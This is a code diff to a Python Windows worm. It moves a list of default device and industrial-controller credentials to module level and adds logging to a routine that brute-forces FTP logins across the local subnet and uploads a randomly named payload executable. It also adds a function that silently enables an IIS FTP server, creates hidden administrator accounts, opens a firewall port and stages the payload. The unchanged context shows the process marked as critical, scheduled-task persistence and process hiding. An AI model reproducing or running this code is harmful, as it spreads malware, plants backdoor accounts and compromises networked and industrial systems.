@@ -9,8 +9,162 @@ import requests
 import urllib3
 import ftplib
 import ctypes
+import getpass
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+common_users = [
+    'test',
+    'abc123',
+    'nic2212',
+    'PlcmSpIp',
+    'accounting',
+    '123456',
+    'nmt',
+    'se',
+    'supervisor',
+    'Root',
+    'MayGion',
+    'USER',
+    'admin',
+    'manager',
+    'mysql',
+    'password',
+    'user',
+    'uploader',
+    'support',
+    'beijer',
+    'fdrusers',
+    'qwerty',
+    'john',
+    getpass.getuser(),
+    'nobody',
+    'administrator',
+    'default',
+    'instrument',
+    'device',
+    'httpadmin',
+    'none',
+    'ftpuser',
+    'pr',
+    'anonymous',
+    'post',
+    'Guest',
+    'marketing',
+    'mail',
+    'hr',
+    'User',
+    'IEIeMerge',
+    'sysdiag',
+    'webserver',
+    'localadmin',
+    'ftp',
+    'QNUDECPU',
+    'qbf77101',
+    'webmaster',
+    'apc',
+    'ADMIN',
+    'dmftp',
+    'sa',
+    'Admin',
+    'postmaster',
+    'dm',
+    'oracle',
+    '111111',
+    'adtec',
+    'a',
+    'root',
+    'user1',
+    'loader',
+    'su',
+    'MELSEC',
+    'ntpupdate',
+    'ftp_boot',
+    'pcfactory',
+    'sales',
+    'www-data',
+    'wsupgrade',
+    'avery',
+]
+common_pass = [
+    '',
+    'USER',
+    'admin',
+    'Janitza',
+    'eqidemo',
+    'spam',
+    'anonymous',
+    'supervisor',
+    'factorycast@schneider',
+    'user00',
+    'password',
+    '12hrs37',
+    '123456',
+    'beijer',
+    'maygion.com',
+    'webadmin',
+    'b1uRR3',
+    'test2',
+    'webmaster',
+    'eMerge',
+    'pass1',
+    'test',
+    'test123',
+    'nobody',
+    'test1',
+    'root',
+    'news',
+    'info',
+    'ftp',
+    'ntpupdate',
+    'webpages',
+    'sresurdf',
+    'uploader',
+    'pcfactory',
+    'ZYPCOM',
+    'apc',
+    'admin12345',
+    'mysql',
+    'system',
+    'none',
+    '1111',
+    'ftp_boot',
+    'MELSEC',
+    'guest',
+    'nas',
+    'hexakisoctahedron',
+    'techsupport',
+    'localadmin',
+    'default',
+    'wsupgrade',
+    'stingray',
+    'dpstelecom',
+    'fwdownload',
+    'abc123',
+    'web',
+    'testingpw',
+    'ko2003wa',
+    'oracle',
+    'cvsadm',
+    '1234',
+    'testing',
+    'test4',
+    'wago',
+    'test3',
+    'tester',
+    '12345',
+    'avery',
+    'instrument',
+    'user',
+    'testuser',
+    'fhttpadmin',
+    'QNUDECPU',
+    '9999',
+    'rootpasswd',
+    'PlcmSpIp',
+    'poiuypoiuy',
+    'sysadm'
+]
 
 RtlSetProcessIsCritical = ctypes.windll.ntdll.RtlSetProcessIsCritical
 RtlSetProcessIsCritical.argtypes = [ctypes.c_uint, ctypes.c_uint, ctypes.c_uint]
@@ -48,160 +202,10 @@ def download_payload():
         return None
 
 # FTP propagation to subnet servers
-def ftp_spread():
+def ftp_spread(common_users, common_pass):
     global PAYLOAD_PATH
     try:
         local_ip = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0]
-        common_users = [
-            'test',
-            'abc123',
-            'nic2212',
-            'PlcmSpIp',
-            'accounting',
-            '123456',
-            'nmt',
-            'se',
-            'supervisor',
-            'Root',
-            'MayGion',
-            'USER',
-            'admin',
-            'manager',
-            'mysql',
-            'password',
-            'user',
-            'uploader',
-            'support',
-            'beijer',
-            'fdrusers',
-            'qwerty',
-            'john',
-            'nobody',
-            'administrator',
-            'default',
-            'instrument',
-            'device',
-            'httpadmin',
-            'none',
-            'ftpuser',
-            'pr',
-            'anonymous',
-            'post',
-            'Guest',
-            'marketing',
-            'mail',
-            'hr',
-            'User',
-            'IEIeMerge',
-            'sysdiag',
-            'webserver',
-            'localadmin',
-            'ftp',
-            'QNUDECPU',
-            'qbf77101',
-            'webmaster',
-            'apc',
-            'ADMIN',
-            'dmftp',
-            'sa',
-            'Admin',
-            'postmaster',
-            'dm',
-            'oracle',
-            '111111',
-            'adtec',
-            'a',
-            'root',
-            'user1',
-            'loader',
-            'su',
-            'MELSEC',
-            'ntpupdate',
-            'ftp_boot',
-            'pcfactory',
-            'sales',
-            'www-data',
-            'wsupgrade',
-            'avery',
-        ]
-        common_pass = [
-            'USER',
-            'admin',
-            'Janitza',
-            'eqidemo',
-            'spam',
-            'anonymous',
-            'supervisor',
-            'factorycast@schneider',
-            'user00',
-            'password',
-            '12hrs37',
-            '123456',
-            'beijer',
-            'maygion.com',
-            'webadmin',
-            'b1uRR3',
-            'test2',
-            'webmaster',
-            'eMerge',
-            'pass1',
-            'test',
-            'test123',
-            'nobody',
-            'test1',
-            'root',
-            'news',
-            'info',
-            'ftp',
-            'ntpupdate',
-            'webpages',
-            'sresurdf',
-            'uploader',
-            'pcfactory',
-            'ZYPCOM',
-            'apc',
-            'admin12345',
-            'mysql',
-            'system',
-            'none',
-            '1111',
-            'ftp_boot',
-            'MELSEC',
-            'guest',
-            'nas',
-            'hexakisoctahedron',
-            'techsupport',
-            'localadmin',
-            'default',
-            'wsupgrade',
-            'stingray',
-            'dpstelecom',
-            'fwdownload',
-            'abc123',
-            'web',
-            'testingpw',
-            'ko2003wa',
-            'oracle',
-            'cvsadm',
-            '1234',
-            'testing',
-            'test4',
-            'wago',
-            'test3',
-            'tester',
-            '12345',
-            'avery',
-            'instrument',
-            'user',
-            'testuser',
-            'fhttpadmin',
-            'QNUDECPU',
-            '9999',
-            'rootpasswd',
-            'PlcmSpIp',
-            'poiuypoiuy',
-            'sysadm'
-        ]
         done = False
         for i in range(1, 255):
             ip = f'{local_ip}.{i}'
@@ -210,6 +214,7 @@ def ftp_spread():
                 done = False
                 for pwd in common_pass:
                     try:
+                        print(f"Trying for ip: {ip} with user: {user} pass: {pwd}")
                         ftp = ftplib.FTP(ip, timeout=1)
                         ftp.login(user, pwd)
                         random_name = f'{generate_random_name()}.exe'
@@ -219,6 +224,7 @@ def ftp_spread():
                             with open(payload_path, 'rb') as f:
                                 ftp.storbinary(f'STOR {random_name}', f)
                         ftp.quit()
+                        print(f"DONE Sending file for user: {user}, ip: {ip}")
                         done = True
                         break 
                     except:
@@ -285,9 +291,111 @@ def persist_schtasks():
     except:
         pass
 
+# Enable and configure Windows IIS FTP server
+def setup_ftp_server(usernames, passwords):
+    try:
+        # Check if FTP server is enabled
+        result = subprocess.run(
+            ['dism.exe', '/online', '/get-featureinfo', '/featurename:IIS-FTPServer'],
+            capture_output=True, text=True, creationflags=0x08000000
+        )
+        if 'State : Enabled' not in result.stdout:
+            # Enable IIS FTP Server feature
+            result = subprocess.run(
+                'dism /online /enable-feature /featurename:IIS-FTPServer /all',
+                shell=True, capture_output=True, text=True, creationflags=0x08000000
+            )
+            if result.returncode == 0: print(f"IIS FTP Server feature enabled successfully: {result.stdout}")
+            else:  
+                print(f"Error enabling IIS FTP Server feature: {result.stderr}")
+                return
+
+        # Start FTP service
+        subprocess.run(
+            'net start ftpsvc',
+            shell=True, capture_output=True, creationflags=0x08000000
+        )
+
+        # Create obscure FTP root directory
+        ftp_root = r'C:\ProgramData\SystemFiles\Updates\Resources\ftpdata'
+        if not os.path.exists(ftp_root):
+            os.makedirs(ftp_root)
+
+        # Configure FTP site using appcmd with port fallback
+        site_name = 'DefaltSite'
+        appcmd = r'C:\Windows\System32\inetsrv\appcmd.exe'
+        ports = [21]
+        for i in range(2121, 2200, 1): ports.append(i)
+        result = subprocess.run(
+            ['C:\\Windows\\System32\\netstat.exe', '-a', '-n', '-p', 'TCP'],
+            capture_output=True, text=True, creationflags=0x08000000
+        )
+        selected_port = None
+        for port in ports:
+            if f':{port}' not in result.stdout:
+                try:
+                    result = subprocess.run(
+                        [appcmd, 'add', 'site', f'/name:{site_name}', f'/bindings:ftp://*:{port}', f'/physicalPath:{ftp_root}'],
+                        shell=True, capture_output=True, creationflags=0x08000000
+                    )
+                    if result.returncode == 0: 
+                        selected_port = port
+                        break
+                except:
+                    continue
+        if not selected_port:
+            return
+        print(f"Selected port: {selected_port}")
+        # Enable anonymous and basic authentication
+        subprocess.run(
+            [appcmd, 'set', 'config', '-section:system.applicationHost/sites', f"/[name='{site_name}'].ftpServer.security.authentication.anonymousAuthentication.enabled:True", '/commit:apphost'],
+            shell=True, capture_output=True, creationflags=0x08000000
+        )
+        subprocess.run(
+            [appcmd, 'set', 'config', '-section:system.applicationHost/sites', f"/[name='{site_name}'].ftpServer.security.authentication.basicAuthentication.enabled:True", '/commit:apphost'],
+            shell=True, capture_output=True, creationflags=0x08000000
+        )
+
+        random_pairs = random.sample(list(zip(usernames, passwords)), 3)
+        common_users = [('ftp', 'ftp'), ('admin', 'password')] + random_pairs
+
+        # Add FTP users and grant access
+        for username, password in common_users:
+            print(f"Creating user: {username}")
+            subprocess.run(
+                ['net.exe', 'user', username, password, '/add'],
+                shell=True, capture_output=True, creationflags=0x08000000
+            )
+            subprocess.run(
+                ['net.exe', 'localgroup', 'Administrators', username, '/add'],
+                shell=True, capture_output=True, creationflags=0x08000000
+            )
+            subprocess.run(
+                ['icacls.exe', ftp_root, '/grant', f'{username}:(R,W)'],
+                shell=True, capture_output=True, creationflags=0x08000000
+            )
+
+        # Add firewall rule for selected port
+        subprocess.run(
+            f'netsh advfirewall firewall add rule name="Allow_FTP_{selected_port}" dir=in action=allow protocol=TCP localport={selected_port}',
+            shell=True, capture_output=True, creationflags=0x08000000
+        )
+
+        # Upload payload to local FTP server
+        payload_path = PAYLOAD_PATH if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH) else download_payload()
+        if payload_path and os.path.exists(payload_path):
+            random_name = f'{generate_random_name()}.exe'
+            destination = os.path.join(ftp_root, random_name)
+            shutil.copy2(payload_path, destination)
+        print("DONE")
+    except Exception as e:
+        print(f"Got new exception: {e}")
+        pass
+
 if __name__ == "__main__":
     set_process_as_critical()
     persist_schtasks()
+    setup_ftp_server(common_users, common_pass)
     hide_process()
     download_payload()
-    ftp_spread()
+    ftp_spread(common_users, common_pass)
